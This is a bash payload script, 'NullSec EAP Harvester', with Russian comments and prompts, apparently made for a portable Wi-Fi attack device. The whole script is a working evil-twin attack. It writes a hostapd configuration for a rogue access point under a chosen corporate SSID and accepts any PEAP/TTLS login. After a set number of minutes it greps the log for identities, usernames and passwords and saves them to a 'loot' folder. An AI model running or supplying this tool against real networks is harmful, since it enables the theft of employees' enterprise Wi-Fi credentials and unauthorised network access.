#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: NullSec EAP Harvester
# Author: bad-antics
# Description: Захват учетных данных EAP корпоративной Wi-Fi через hostile-portal-toolkit
# Category: nullsec

# FIX: PATH и fallback-функции для UI
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Нажмите Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ОШИБКА: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[ЛОГ] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Готово"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Значение: " val; echo "$val"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Выбор: " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Подтвердить (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

LOOT_DIR="/mmc/nullsec/captures/eap"
mkdir -p "$LOOT_DIR"

# Проверка наличия hostapd
if ! command -v hostapd >/dev/null 2>&1; then
    ERROR_DIALOG "hostapd не установлен! Установите: opkg install hostapd"
    exit 1
fi

PROMPT "EAP HARVESTER
━━━━━━━━━━━━━━━━━━━━━━━━━
Захват учётных данных
корпоративной Wi-Fi (EAP/PEAP).

Создаёт поддельную точку
доступа с SSID цели.

Нажмите OK для настройки."

# Настройки через UI-заглушки
TARGET_SSID=$(TEXT_PICKER "Целевой SSID:" "CorpWiFi")
[ -z "$TARGET_SSID" ] && TARGET_SSID="CorpWiFi"

DURATION=$(NUMBER_PICKER "Длительность (минуты):" 10)
[ -z "$DURATION" ] && DURATION=10
[ $DURATION -lt 1 ] && DURATION=1
[ $DURATION -gt 60 ] && DURATION=60

resp=$(CONFIRMATION_DIALOG "Настройки захвата EAP:
━━━━━━━━━━━━━━━━━━━━━━━━━
SSID: $TARGET_SSID
Длительность: ${DURATION} мин

Будет создана поддельная точка доступа
и начат сбор EAP учётных данных.

НАЧАТЬ?")
[ "$resp" != "0" ] && exit 0

OUTFILE="$LOOT_DIR/eap_$(date +%Y%m%d_%H%M%S).txt"
SPINNER_START "Сбор EAP данных..."

# Конфиг hostapd
hostapd_conf="/tmp/eap_hostapd.conf"
cat > "$hostapd_conf" << HAPD
interface=wlan1
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eap_users
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
HAPD

# Файл пользователей EAP
echo '"*" PEAP,TTLS' > /tmp/eap_users

# Запуск hostapd в фоне
hostapd "$hostapd_conf" > /tmp/eap_log.txt 2>&1 &
HAPD_PID=$!

sleep $((DURATION * 60))
kill $HAPD_PID 2>/dev/null
SPINNER_STOP

CRED_COUNT=$(grep -c "IDENTITY\|identity" /tmp/eap_log.txt 2>/dev/null)
[ -z "$CRED_COUNT" ] && CRED_COUNT=0
grep -i "identity\|username\|password" /tmp/eap_log.txt > "$OUTFILE" 2>/dev/null

PROMPT "ЗАХВАТ EAP ЗАВЕРШЁН
━━━━━━━━━━━━━━━━━━━━━━━━━
Идентификаторов: $CRED_COUNT
SSID: $TARGET_SSID
Длительность: ${DURATION} мин

Результат: $(basename "$OUTFILE")"

exit 0
